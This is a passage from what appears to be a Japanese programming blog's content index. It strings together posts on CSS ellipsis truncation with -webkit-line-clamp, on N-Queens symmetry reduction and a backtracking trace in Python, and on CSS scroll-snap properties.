\u0026lt;/div\u0026gt; 下記に、実行結果が表示されているかと思います。\nこれでも対応できてるじゃんと思う方もいるかと思いますが、文字が変わったりした場合、どうするのでしょうか？\n毎回数えて修正を加えるというのはかなり難しいことに気づくはずです。\n1行にして3点リーダーを表示する それでは、自動的に三点リーダーを付与してみましょう。\nまずは1行の3点リーダーを作成する方法です。\np { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; } 上記のCSSを実装した結果が下記になります。\nいかがでしょうか？ちゃんと1行で3点リーダーが表示されているかと思います。\nこれであればどんな文字が来たとしても、自動的に1行表示で3点リーダーを付与することが可能です。\nただし、1行の場合はこの記述で問題ないのですが2行、3行など行数が増えたときに厄介です。\nお知らせの表示やレイアウトで2行にするというのはかなりよくあります。\n複数行でも3点リーダーを表示する そうした場合でも、問題ありません。\n-webkit-line-clampというCSSを使えば複数行でも3点リーダーを付与できます。\n-webkit-line-clampの使用には必須項目があるので注意してください。\n-webkit-line-clamp displayプロパティに-webkit-boxもしくは-webkit-inline-boxが設定されており、かつbox-orientプロパティにverticalが設定されている組み合わせのときのみ使用できます。 上記のように、-webkit-boxとbox-orient: verticalの3点セットで実装可能になるということを覚えておいください。\nそれでは実際に複数行での3点リーダーを実装してみましょう。\np { display: -webkit-box; -webkit-box-orient: vertical; -webkit-line-clamp: 2; overflow: hidden; } 上記のCSSを実装した結果が下記になります。\nさきほどのcssでは1行でしたが、今回は2行の表示で3点リーダーがついていることが確認できるかと思います。\nもちろん、3行、4行と数字を変更することで、行数を変えることもできます。\nそして、-webkit-line-clampを1とすることで、1行表示での三点リーダーも可能です。\n対応端末 -webkit-line-clampの対応端末は2022年時点でほぼすべてのブラウザで使用可能です。\nIEに関してはサポートが終了するので今回は考えないことにします。\n-webkit-line-clampはIE以外のモダンブラウザで使用可能 まとめ PCやスマホなどマルチデバイスなどに対応する際に、3点リーダーを使用する頻度はかなり多いです。\nそうした場合に、文字を複数用意したり、人力で文字を削って対応するのはナンセンスです。\n1行表示の場合はtext-overflow: ellipsis;対応。1行の他に、複数行の場合は-webkit-line-clampで対応して、より柔軟な設計を行いましょう。\nオススメの書籍 HTML5 \u0026amp; CSS3 デザインレシピ集 本書は、HTML5とCSS3によるWebサイト制作のための\u0026#34;おいしい\u0026#34;レシピ集です。 制作の現場で使われる定番テクニックから、プロ技まで余すところなく集めました。 テキスト/リスト/リンク/画像/ボックス/ テーブル/フォーム/ナビゲーション/ レイアウト/レスポンシブWebデザイン… テーマ別にレシピを整理しているので、引きやすくなっています。 「あのデザインはどう作るんだろう?」が、スグにわかります。 デザイナーからWebプログラマーまで、Web制作に携わるすべての方にお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 HTML5＋CSS3の新しい教科書　改訂新版　基礎から覚える、深く理解できる。 この商品は固定レイアウトで作成されており、タブレットなど大きいディスプレイを備えた端末で読むことに適しています。また、文字列のハイライトや検索、辞書の参照、引用などの機能が使用できません。 〈電子書籍版に関する注意事項〉 本書は固定レイアウト型の電子書籍です。リフロー型と異なりビューア機能が制限されるほか、端末によって見え方が異なりますので、ご購入前にお使いの端末にて「無料サンプル」をお試しください。 【技術の進化に左右されないWebサイトの作り方がわかる！】 Web制作のプロを目指す方に向けて、HTML5\u0026#43;CSS3を使ったWebサイトの作り方を解説した入門書の改訂版。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-17T16:31:05+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-17-01-wyoshi/img01_hued0e192f18d41708fb9ce45664b03bde_79209_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-17-01-wyoshi/","title":"CSSだけで簡単に1行や複数行の3点リーダーを付ける方法"},{"content":"対象解除法 今回から対象解除法を取り扱います。 解を見てみると左右反転だったり90度、180度回転すると同じものがあります。この性質を利用して探索回数を減らそうというアルゴリズムです。\nプログラムソースは以下のURLにあります。 https://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py04_nqueen.py\nまずプログラムを実行してみましょう。\npython py04_nqueen.py で実行できます。\nn4からn15までnqueenを実行し解の数とかかった時間を出力します。\nN: Total Unique hh:mm:ss.ms 4: 2 1 0:00:00.000 5: 10 2 0:00:00.000 6: 4 1 0:00:00.000 7: 40 6 0:00:00.001 8: 92 12 0:00:00.004 9: 352 46 0:00:00.018 10: 724 92 0:00:00.080 11: 2680 341 0:00:00.372 Total が解の総数になります。Uniqueが左右反転、90度、180度回転させて同じものを同一解として取り扱ったものです。\nUniqueはTotalに比べるとかなり少なくN8ですとTotal 92に対してUnique が12です。\nUnique解からTotalの数を一定の法則で計算が可能です。\nまず全ての解は左右反転できます。\nさらに90度回転して同じであればその4倍 180度回転で同じあればその2倍となります。\nすなわち\n90度回転して同じであれば 8倍\n180度回転して同じであれば 4倍\nそれ以外は 2倍\nとなります。\nもしこれが本当であれば、全てのTotalのルートを探索する必要はなく、全てのUniqueのルートを探索しさえすればあとは単純な掛け算で解の総数を出すことができます。大幅な探索コストの削減が期待できそうです。\n本当にそうなのでしょうか？\npy04_nqueen.pyは実行結果は正解数だけしか出力していません。\nそこで、プログラムを改造してクイーンの位置も出力するようにして目で見て確かめてみましょう。\nプログラムのどの部分を改造すれば良いでしょうか？\nそれでは、プログラムを眺めてみましょう。\nグローバル変数 py03_nqueen.py と違う部分は\n221,222行目のAT,AS配列です。\nAT,ASは321行目のsymmetryopsメソッド内で左右反転、90度、180度回転して同じかチェックする箇所があるのですが。そこで使用します。\nそれ以外は同じです。\n314行目のABOARD配列はpy03_nqueen.pyでは宣言するだけで使用していませんでしたが今回からは使用します。\nABOARD配列は各行のどこにクイーンを設置したかを記憶しておく配列です。\nsymmetryopsメソッドで反転回転チェックをする際に使用します。\n各行のクイーンの場所を記憶しているのででプログラムを改造する時はこの配列を使ってクイーンの位置を出力すれば良さそうですね。\nmainメソッド py03_nquenn.pyと違う部分は337行目でABOARDをglobal宣言しているだけでそれ以外は同じです。\npy03ではABOARDを宣言しただけでプログラムのなかで使用していなかったのですが今回からは本格的に使用するためちゃんとglobal宣言しています。\nmainメソッドはn4からn15まで346行目でnqueenメソッドを呼び出して解を求め\nnごとにTOTAL,UNIQUE,かかった時間を出力します\nnqueen py03_nqueen.pyとほとんど一緒です。\nFA,FB,FCフラグで上下、左右対角線をチェックしながら再帰を利用しながら1行に1個ずつクイーンを置いていきます。\n違う部分はどこでしょう。\nまず、ABOARDを使うので314行目でABOARDをglobal宣言しています。\n次に、if row == size :で全行クイーンを置き終わった時の処理が違います。\npy03ではTOTALに1を加算していただけですが、py04はsymmetryopsメソッドを呼び出しています。\nsymmetryopsでは左右反転、90度、180度回転して同じものがあるかどうかチェックします。\nsymmetryopsの詳細な説明は後に譲りますが、同じものの中で優先順位の最も高いものだけが8(90度回転して同じ),4(180度回転して同じ),2(左右反転のみ)のスコアを返し、その他は0のスコアを返します。\n322行目でstotalが0以外の時のみUNIQUEを1加算し、stotal 2,4,8いずれかのスコアをTOTALに加算します。\n改造を加える部分は？ ざっとプログラムの概要を説明しましたが、それではどの部分に改造を加えてクイーンの設置場所を出力すると良いでしょうか？\n全行クイーンを置き終わった時が良いですよね。\nとすると 320行目の if row==size の後が良いでしょう。\nユニークなのか90,180度回転して同じものがあるのかも知りたいですから、\n321行目のsymmetryopsを実行した後が良いですね。\nそして、stotalが0の時優先順位で負けたもののクイーンの配置を出力したいですから322行目より前の方が良いですね。\nですので、321行目と322行目の間でクイーンの設置場所を出力するように改造しましょう。\n長くなったので今回はここまでで次回プログラムを改造しましょう。\n","date":"2022-02-16T18:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-16-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-16-01-ani/","title":"第8回 pythonでNQueen（エイトクイーン）対象解除法（1）"},{"content":"バックトラック 今回も引き続きバックトラックを説明していきたいと思います。 前回はプログラムの概要を説明しましたが、今回はnqueenメソッドの再帰とバックトラックの動きについて図で示しながら説明していきたいとおもいます。\nプログラムソースは以下のURLにあります。\nhttps://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py03_nqueen.py\nおさらい ブルートフォース、配置フラグからのおさらいとして次の点を押さえておきましょう。 ・448行目のABOARD[row]=i はクイーンを配置する動きです。 ・452行目のnqueen(row+1)は再帰でnqueenメソッドを動かしていますがこれは次の行に進む動きです。 ・444,445は最終行(4行目)までクイーンを置ききった後にTOTALに1加算しています。フラグチェックを通過して最終行まで到達すれば正解と判断して良いからです。\n再帰でnqueenメソッドを呼び出したときは、当然のことなのですがメソッドの先頭439行目に移動します。\n引数で渡されたrow、size以外のローカル変数はすべて初期化された状態になります。\n・再帰から抜ける部分は2箇所あります。\n一つ目は、444,445行目で最終行(4行目)までクイーンを置ききった後にTOTALを加算する時\n二つ目は、447行目のfor文がSIZE数の数(N=4だと3)だけ回りきったあとです。\n再帰から抜けたときは再帰を呼び出した452行目のすぐ後ろからスタートします。\nローカル変数の状態は再帰を呼び出す直前の状態になります。\n1行前に戻るような動きとなります。\nちなみに447行目のfor i in range(SIZE)は右端から左端に1個ずつクイーンを置こうとする動きです。\n左端までクイーンを置ききったらfor文を抜けるイメージです。\n450行目のif FA[i] == 0 and FB[row-i+(size-1)] == 0 and FC[row+i] == 0:でFA,FB,FCの配置フラグで利き筋をチェックしています。\nFAが上下の利き筋\nFBが左対角線上の利き筋\nFCが右対角線上の利き筋\nをチェックしています\nnqueen メソッドの動き 467行目のnqueen(0,i)からスタートします。\nメソッドの先頭439行目に移動します。\nrow=0なので446行目の else: に移動します。\n447行目のfor文に入りi=0からスタートします。\n448行目のABOARD[0]=0で1行目の右端にクイーンを設置します。\n図 1個目のクイーンなので当然配置フラグはどれもOの状態ですから450行目のif FA[0] == 0 FB[row-i+(size-1)] == 0 FC[row+i] == 0の条件を満たしてif文の中に入ります。\n451行目でフラグを立てますが以下のようになります。\n配列の個数は2MAX-1 MAX=16なので31個ですが31個必要なのはN=16の時です。\nN=4のときは24-1で7個あれば足ります。\nrow=0,i=0なので\nFA\nFA[0]=1で\nFA[0]=1 FA[1]=0 FA[2]=0 FA[3]=0 FA[4]=0 FA[5]=0 FA[6]=0 FB\nrow-i+(size-1)\n0-0+(4-1)=3\nFB[3]=1\nFB[0]=0 FB[1]=0 FB[2]=0 FB[3]=1 FB[4]=0 FB[5]=0 FB[6]=0 FC\nrow+i\n0+0=0\nFC[0]=1\nFC[0]=1 FC[1]=0 FC[2]=0 FC[3]=0 FC[4]=0 FC[5]=0 FC[6]=0 利き筋をビジュアルで表示すると以下の通りです。黒いクイーンの部分は置けません。\n図 452行目でnqueenを引数1を渡して呼び出して2行目に進みます。\n図だと2行目でクイーンを置けるのは3,4列目ですがプログラムの動きではどうなるのか見てみましょう。\n再帰呼び出しなのでrow=1の状態でメソッドの先頭439行目に移動します。\nrow=1なので446行目の else: に移動します。\n447行目のfor文に入りi=0からスタートします。\n448行目のABOARD[1]=0で2行目の右端にクイーンを設置します。\n1行目で既に右端にクイーンを設置していますのでFA[0]は1になりますので450行目のif FA[i]==0の条件を満たしません。\nif文に入らずに次のfor文に進みます。\nこの部分が配置フラグの制御になります。\nこの処理のおかげで上下、左右対角線上の利き筋に引っかかる場合は次の行に移動するのをやめ探索を効率化することができます。\n447行目で次のfor文に進みi=1となります。\n448行目のABOARD[1]=1で2行目の右から2列目にクイーンを設置します。\n450行目でフラグをチェックします\nFAのフラグの状態は以下の通りです\nFA[0]=1 FA[1]=0 FA[2]=0 FA[3]=0 FA[4]=0 FA[5]=0 FA[6]=0 i=1\nFA[1]==0ですのでFAフラグは通過します。\nFBのフラグの状態は以下の通りです\nFA[0]=0 FB[1]=0 FB[2]=0 FB[3]=1 FB[4]=0 FB[5]=0 FB[6]=0 row=1,i=1\nrow-i+(size-1)\n1-1+(4-1)=3\nFB[3]==1ですのでFBフラグは通過しません\n左対角線上の利き筋に引っかかることになります。\n447行目で次のfor文に進みi=2となります。\n448行目のABOARD[1]=2で2行目の右から3列目にクイーンを設置します。\n図 450行目でフラグをチェックします\nrow=1,i=2\nFA[2]==0なのでFAのフラグは通過しますFB[row-i+(size-1)-\u0026gt;FB[1-2+(4-1)]-\u0026gt;FB[2]==0なのでFBフラグは通過します\nFC[row+i]-\u0026gt;FC[1+2]-\u0026gt;FC[3]==0なのでFCフラグも通過します\nif 文の中に入って451行目でフラグをたてます\nFA\nFA[2]=1で\nFA[0]=1 FA[1]=0 FA[2]=1 FA[3]=0 FA[4]=0 FA[5]=0 FA[6]=0 FB\nFB[2]=1\nFB[0]=0 FB[1]=0 FB[2]=1 FB[3]=1 FB[4]=0 FB[5]=0 FB[6]=0 FC\nFC[3]=1\nFC[0]=1 FC[1]=0 FC[2]=0 FC[3]=1 FC[4]=0 FC[5]=0 FC[6]=0 ビジュアルで利き筋をみてみると以下の通りです。\n図 3行目にクイーンを置ける場所はなさそうです。\n452行目でnqueenを引数2を渡して呼び出して3行目に進みます。\nrow=2,for=0,1,2,3 で450行目のフラグを見てみましょう\nrow=2,i=0\nFA[i]-\u0026gt;FA[0]==1\nFAフラグに引っかかります\nrow=2,i=1\nFA[i]-\u0026gt;FA[1]==0\nFB[row-i+(size-1)]-\u0026gt;FB[2-1+(4-1)]-\u0026gt;FB[4]==0\nFC[row+i]-\u0026gt;FC[2+1]-\u0026gt;FC[3]==1\nFCフラグに引っかかります\nrow=2,i=2\nFA[i]-\u0026gt;FA[2]==1\nFAフラグに引っかかります\nrow=2,i=3\nFA[i]-\u0026gt;FA[3]==0\nFB[row-i+(size-1)]-\u0026gt;FB[2-3+(4-1)]-\u0026gt;FB[2]==0\nFBフラグに引っかかります\ni=3までだめなのでfor文を抜けます。\nfor文を抜けると再帰を抜け2行目の処理(row=1)に戻ります。\nrow=1,i=2\n453行目でフラグを落とします\n今の状態のフラグが以下の通りです。\nFA\nFA[2]=1 のフラグを0にします。\nFA[0]=1 FA[1]=0 FA[2]=1--\u0026gt;FA[2]=0 FA[3]=0 FA[4]=0 FA[5]=0 FA[6]=0 FB\nFB[2]=1 のフラグを0にします。\nFB[0]=0 FB[1]=0 FB[2]=1--\u0026gt;FB[2]=0 FB[3]=1 FB[4]=0 FB[5]=0 FB[6]=0 FC\nFC[3]=1 のフラグを0にします。\nFC[0]=1 FC[1]=0 FC[2]=0 FC[3]=1--\u0026gt;FC[3]=0 FC[4]=0 FC[5]=0 FC[6]=0 447行目で次のfor文に進みi=3となります。\n448行目のABOARD[1]=3で2行目の右から4列目にクイーンを設置します。\n図 450行目でフラグをチェックします\nrow=1,i=3\nフラグをチェックしてみましょう。\nFA[i]-\u0026gt;FA[3]==0\nFB[row-i+(size-1)]-\u0026gt;FB[1-3+(4-1)]-\u0026gt;FB[1]==0\nFC[row+i]-\u0026gt;FC[1+3]-\u0026gt;FC[4]==0\nFA,FB,FCいずれのフラグチェックもクリアしますので451行目のif文に入ります。\n451行目でフラグをたてると以下のようになります。\nFA\nFA[3]=1 のフラグを1にします。\nFA[0]=1 FA[1]=0 FA[2]=0 FA[3]=1 FA[4]=0 FA[5]=0 FA[6]=0 FB\nFB[1]=1 のフラグを1にします。\nFB[0]=0 FB[1]=1 FB[2]=0 FB[3]=1 FB[4]=0 FB[5]=0 FB[6]=0 FC\nFC[4]=1 のフラグを1にします。\nFC[0]=1 FC[1]=0 FC[2]=0 FC[3]=0 FC[4]=1 FC[5]=0 FC[6]=0 図 452行目でnqueenを引数2を渡して呼び出して3行目に進みます。 再帰呼び出しなのでrow=2の状態でメソッドの先頭439行目に移動します。 row=2なので446行目の else: に移動します。 447行目のfor文に入りi=0からスタートします。 448行目のABOARD[2]=0で3行目の右端にクイーンを設置します。\n450行目でフラグをチェックします\nrow=2,i=0\nFA[i]-\u0026gt;FA[0]==1\nFAフラグに引っかかります\n447行目で次のfor文に進みi=1となります。\n448行目のABOARD[2]=1で3行目の右から2列目にクイーンを設置します。\n図 450行目でフラグをチェックします\nrow=2,i=1\nフラグをチェックしてみましょう。\nFA[i]-\u0026gt;FA[1]==0\nFB[row-i+(size-1)]-\u0026gt;FB[2-1+(4-1)]-\u0026gt;FB[4]==0\nFC[row+i]-\u0026gt;FC[2+1]-\u0026gt;FC[3]==0\nFA,FB,FCいずれのフラグチェックもクリアしますので451行目のif文に入ります。\n451行目でフラグをたてると以下のようになります。\nFA\nFA[1]=1 のフラグを1にします。\nFA[0]=1 FA[1]=1 FA[2]=0 FA[3]=1 FA[4]=0 FA[5]=0 FA[6]=0 FB\nFB[4]=1 のフラグを1にします。\nFB[0]=0 FB[1]=1 FB[2]=0 FB[3]=1 FB[4]=1 FB[5]=0 FB[6]=0 FC\nFC[3]=1 のフラグを1にします。\nFC[0]=1 FC[1]=0 FC[2]=0 FC[3]=1 FC[4]=1 FC[5]=0 FC[6]=0 図 ビジュアル的にみると4行目にクイーンを置ける場所はなさそうですね。\nプログラムでの動きを見てみましょう\n452行目でnqueenを引数3を渡して呼び出して3行目に進みます。\n再帰呼び出しなのでrow=3の状態でメソッドの先頭439行目に移動します。 row=2なので446行目の else: に移動します。\n447行目のfor文に入りi=0からスタートします。\ni=0,1,2,3での450行目のフラグ判定を見てみましょう\nrow=3,i=0\nFA[i]-\u0026gt;FA[0]==1\nFAフラグに引っかかります\nrow=3,i=1\nFA[i]-\u0026gt;FA[1]==1\nFAフラグに引っかかります\nrow=3,i=2\nFA[i]-\u0026gt;FA[2]==0\nFB[row-i+(size-1)]-\u0026gt;FB[3-2+(4-1)]-\u0026gt;FB[4]==1\nFBフラグに引っかかります\nrow=2,i=3\nFA[i]-\u0026gt;FA[3]==0\nFAフラグに引っかかります\ni=3までだめなのでfor文を抜けます。\nfor文を抜けると再帰を抜け3行目の処理(row=2)に戻ります。\nrow=2,i=1の状態で452行目の直後に移動します。\n453行目でフラグを落とします\n今の状態のフラグが以下の通りです。\nFA\nFA[1]=1 のフラグを0にします。\nFA[0]=1 FA[1]=0 FA[2]=0 FA[3]=1 FA[4]=0 FA[5]=0 FA[6]=0 FB\nFB[4]=1 のフラグを1にします。\nFB[0]=0 FB[1]=1 FB[2]=0 FB[3]=1 FB[4]=0 FB[5]=0 FB[6]=0 FC\nFC[3]=1 のフラグを1にします。\nFC[0]=1 FC[1]=0 FC[2]=0 FC[3]=0 FC[4]=1 FC[5]=0 FC[6]=0 フラグを落としたら447行目次のfor文にいきます。\nrow=2,i=2\nrow=2,i=3\nいずれも450行目のフラグに引っかかります。\ni=3までだめなのでfor文を抜けます。\nfor文を抜けると再帰を抜け2行目の処理(row=1)に戻ります。\nrow=1,i=3の状態で452行目の直後に移動します。\nすでにi=3の状態ですからそのままfor文をぬけ再帰を抜けて1行目の処理(row=0)に戻ります。\nrow=0,i=0\n453行目でフラグを落としますが1行目ですのでまっさらな状態になります。\n447行目で次のfor文に移動します。\nrow=0,i=1ですので448行目のABOARD[0]=1 で1行目の右から2列目にクイーンをおきます。\n図 1個目のクイーンなので当然配置フラグはどれもOの状態ですから450行目のif FA[0] == 0 FB[row-i+(size-1)] == 0 FC[row+i] == 0の条件を満たしてif文の中に入ります。\n451行目でフラグを立てます\nrow=0,i=1なので\nFA\nFA[1]=1で\nFA[0]=0 FA[1]=1 FA[2]=0 FA[3]=0 FA[4]=0 FA[5]=0 FA[6]=0 FB\nrow-i+(size-1)\n0-1+(4-1)=2\nFB[2]=1\nFB[0]=0 FB[1]=0 FB[2]=1 FB[3]=0 FB[4]=0 FB[5]=0 FB[6]=0 FC\nrow+i\n0+1=0\nFC[1]=1\nFC[0]=0 FC[1]=1 FC[2]=0 FC[3]=0 FC[4]=0 FC[5]=0 FC[6]=0 利き筋をビジュアルで表示すると以下の通りです。黒いクイーンの部分は置けません。\n図 452行目でnqueenを引数1を渡して呼び出して2行目に進みます。\n図だと2行目でクイーンを置けるのは4列目だけです。\n図 447行目のfor文の中でrow=1 i=0,1,2の時にいずれも450行目の配置フラグの制御に引っかかって次のfor文に進みます。\nrow=1,i=3の時に450行目の配置フラグを通り抜けられます。\nFA[i]-\u0026gt;FA[3]==0\nFB[row-i+(size-1)]-\u0026gt;FB[1-3+(4-1)]-\u0026gt;FB[1]==0\nFC[row+i]-\u0026gt;FC[1+3]-\u0026gt;FC[4]==0\n451行目でフラグを立てると以下の図になります。\n図 row=1,i=3なので\nFA\nFA[3]=1で\nFA[0]=0 FA[1]=1 FA[2]=0 FA[3]=1 FA[4]=0 FA[5]=0 FA[6]=0 FB\nrow-i+(size-1)\n1-3+(4-1)=1\nFB[1]=1\nFB[0]=0 FB[1]=1 FB[2]=1 FB[3]=0 FB[4]=0 FB[5]=0 FB[6]=0 FC\nrow+i\n1+3=0\nFC[4]=1\nFC[0]=0 FC[1]=1 FC[2]=0 FC[3]=0 FC[4]=1 FC[5]=0 FC[6]=0 452行目でrow=2でnqueenを再帰で呼び出します。\nrow=2の時はi=0の時にクイーンを置くことができます。\n図 451行目でフラグを立てると以下の図になります。\nrow=2,i=0なので\nFA\nFA[0]=1で\nFA[0]=1 FA[1]=1 FA[2]=0 FA[3]=1 FA[4]=0 FA[5]=0 FA[6]=0 FB\nrow-i+(size-1)\n2-0+(4-1)=5\nFB[5]=1\nFB[0]=0 FB[1]=1 FB[2]=1 FB[3]=0 FB[4]=0 FB[5]=1 FB[6]=0 FC\nrow+i\n2+0=2\nFC[2]=1\nFC[0]=0 FC[1]=1 FC[2]=1 FC[3]=0 FC[4]=1 FC[5]=0 FC[6]=0 図 図で見ると最終行で右から3番目にクイーンが置けそうです。\n図 452行目でrow=3でnqueenを再帰で呼び出します。\nrow=3,i=2でフラグをチェックしてみましょう。\nFA[i]-\u0026gt;FA[2]==0\nFB[row-i+(size-1)]-\u0026gt;FB[3-2+(4-1)]-\u0026gt;FB[4]==0\nFC[row+i]-\u0026gt;FC[3+2]-\u0026gt;FC[5]==0\n450行目のフラグチェックと通過するので\n452行目でrow=4でnqueenを再帰で呼び出すことができます。\nrow=4で再帰を呼び出すと\nif row== size : のif文に入り\nTOTAL +=1 で総数がカウントされます。\n図 445行目の処理が終わると再帰を抜けて上の行に戻ります。\nそんな感じで再帰呼び出し、再帰を抜けるを繰り返して総数を出します。\n","date":"2022-02-14T17:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/","title":"第7回 pythonでNQueen（エイトクイーン）バックトラック（3）"},{"content":"出典元： CSS Scroll Snap - Ahmad Shadeed アプリなどで横スクロールしてコンテンツにスナップするといった動作をよく見かけると思いますが、CSSで横スクロールのUIを作成しようとすると、専用のjavascriptやライブラリを使用する必要があったりと実装が大変です。\nしかし、CSSスクロールスナップは横スクロールしてスナップするといった動作を行うことができます。\nこの記事では、CSSスクロールスナップ（scroll-snap）の基本について説明します。\nscroll-snapを使用する理由 スマホやタブレットの普及で、タッチでスワイプできる画面を設計、構築する必要があるかと思います。\nたとえば、ギャラリー風のデザインを考えてみましょう。ユーザーは、階層構造ではなく、左または右に簡単にスワイプして、より多くの画像を表示できます。\nCSSの仕様によると、CSSスクロールスナップを導入することでユーザーエクスペリエンスが向上し、スクロールの実装が容易になり、ユーザーと開発者、双方にメリットがあるということです。\nスクロールコンテナーの基本 スクロールコンテナーを作成するために必要な基本的なものは次のとおりです。\noverflowをvisible以外の値で使用 項目を隣同士（インライン）に表示す 例を見てみましょう。\n\u0026lt;div class=\u0026#34;section\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;section__item\u0026#34;\u0026gt;Item 1\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;section__item\u0026#34;\u0026gt;Item 2\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;section__item\u0026#34;\u0026gt;Item 3\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;section__item\u0026#34;\u0026gt;Item 4\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;section__item\u0026#34;\u0026gt;Item 5\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; .section { white-space: nowrap; overflow-x: auto; } 以前まではwhite-space: nowrapを使用することで要素を横並びで表示するようにしていました。\n近年では、この方法の代わりにFlexboxを使用することで表現可能です。\n.section { display: flex; overflow-x: auto; } これは、スクロールコンテナーを作成するための基本的な構成です。\nしかし、これだけではスクロールコンテナーの機能としては不十分です。\n従来の問題 従来の問題は、スワイプの仕組みと比較して、優れたUXが提供されないことです。タッチスクリーンでのスワイプジェスチャの主な利点は、1本の指で水平または垂直にスクロールできることです。\n以前のソリューションでは、ただスクロールするだけです。文字通り、各アイテムをそれぞれの場所に移動する必要があります。これはスワイプではなく、ユーザーにとって非常にストレスを与える結果になってしまします。\nCSSスクロールスナップを使用すると、ユーザーが水平方向または垂直方向にスクロールしやすくなるスナップポイントを定義するだけで、この問題を解決できます。\nCSSスクロールスナップの使用方法を見てみましょう。\nCSSスクロールスナップの紹介 コンテナーでスクロールスナップを使用するには、その子アイテムをinlineで表示する必要があります。これは、上記で説明した方法の1つで実行できます。 CSSフレックスボックスを使用します。\n\u0026lt;div class=\u0026#34;section\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;section__item\u0026#34;\u0026gt;Item 1\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;section__item\u0026#34;\u0026gt;Item 2\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;section__item\u0026#34;\u0026gt;Item 3\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;section__item\u0026#34;\u0026gt;Item 4\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;section__item\u0026#34;\u0026gt;Item 5\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; .section { display: flex; overflow-x: auto; } さらに、スクロールスナップを機能させるために2つのプロパティを追加します。\nまず、スクロールコンテナーにscroll-snap-typeを追加します。この例では、これは.section要素です。\n次に、子アイテム（.section__item）にscroll-snap-alignを追加します。\n.section { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; } .section__item { scroll-snap-align: start; } x mandatoryとstartの値についてはじめて見たと思われるかもしれませんが、この部分が今回の記事のメインになる部分です。\nこれらのプロパティにより、スクロールコンテナーの開始位置にスナップすることが可能になって、スクロールがより自然になりました。\nそれでは、スクロールスナップのプロパティについて詳しく見ていきましょう。\nscroll-snap-type CSSの仕様 によると、scroll-snap-typeは、ある要素がスクロールスナップコンテナーであるかどうか、どの程度厳密にスナップするか、どの軸を考慮するかを指定するものです。\nそれを解析してみましょう。\nスクロールスナップコンテナーの軸について スクロールスナップコンテナーの軸は、スクロールの方向を表します。水平または垂直にできます。\nxの値は水平方向のスクロールを、yの値は垂直方向のスクロールを表します。\n/* Horizontal */ .section { display: flex; overflow-x: auto; scroll-snap-type: x; } /* Vertical */ .section { height: 250px; overflow-y: auto; scroll-snap-type: y; } スクロールスナップコンテナーの精密さ スクロールスナップの方向だけでなく、その精密さも定義できます。\nこれは、scroll-snap-type値にmandatory | proximityのいずれかの値を使用することで可能です。\nmandatoryは、ブラウザが各スクロールポイントにスナップする必要があることを意味します。scroll-snap-alignプロパティの値がstartであると仮定してみましょう。つまり、スクロールはスクロールコンテナーの開始点にスナップする必要があります。\n下図では、ユーザーが右方向にスクロールするたび、ブラウザはコンテナーの開始点にアイテムをスナップさせます。\n.section { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; } .section__item { scroll-snap-align: start; } 下のデモで右方向にスクロールしてみてください。スクロールバーを右に移動させるか、スマートフォンやタブレットの場合はタッチ操作で行ってください。各アイテムがコンテナーの始まりにスナップする様子が感じられるはずです。\nしかし、値がproximityの場合は、ブラウザが作業を行います。定義された点（この例ではstart）にスナップするかもしれません。proximityはデフォルトの値ですが、わかりやすくするために追加しておきます。\n.section { display: flex; overflow-x: auto; /* proximityはデフォルト値です。 */ scroll-snap-type: x proximity; } スクロールスナップの方向 スクロールコンテナーの子アイテムには、スナップできるアライメントポイントが必要です。\nstart、center、endのいずれかを使用します。\nスクロールコンテナーに磁石があり、スナップポイントを制御するのに役立つと想像してみてください。\nscroll-snap-typeが垂直の場合、スナップの配置は垂直になります。次の図を参照してください。\nこれをより明確にするため、 start 、center、およびendの以下のアニメーションを参照してください。\nスクロールコンテナーの start 子アイテムは、水平スクロールコンテナーの先頭にスナップします。\nスクロールコンテナーの center 子アイテムは、スクロールコンテナーの中央にスナップします。\nスクロールコンテナーの end 子アイテムは、スクロールコンテナーの最後にスナップします。\nscroll-snap-stopを使う ユーザーがあまりに速くスクロールするなど、スクロール中にユーザーが誤って重要な項目をスキップしてしまうのを防ぐ方法が必要な場合もあります。\n.section__item { scroll-snap-align: start; scroll-snap-stop: normal; } スクロールのスピードが速すぎる（勢いよくスクロールする）と、3つも4つも項目が飛ばされることもあります。\nscroll-snap-stop のデフォルト値はnormalです。スクロールを強制的にすべての可能なポイントにスナップするには、alwaysを使用する必要があります。 scroll-snap-stop: alwaysを使用すると、ブラウザは各スナップポイントで停止します。\n.section__item { scroll-snap-align: start; scroll-snap-stop: always; } そうすれば、ユーザーは1つずつスナップポイントをスクロールしていくことができ、重要な項目をスキップすることを避けることができます。\n各ストップポイントにストップサインがあることを想像してください。\nデモで下のスクロールを試して、オプションを切り替えてみてください。\nスクロールスナップのpadding scroll-padding短縮形プロパティは、paddingプロパティの動作と同様に、すべての側面にスクロールパディングを設定します。\n下図では、スクロールコンテナーの左側に50pxのパディングが設定されています。その結果、子要素は左端から50pxずれた位置にスナップします。\n.section { overflow-x: auto; scroll-snap-type: x mandatory; scroll-padding: 0 0 0 50px; } 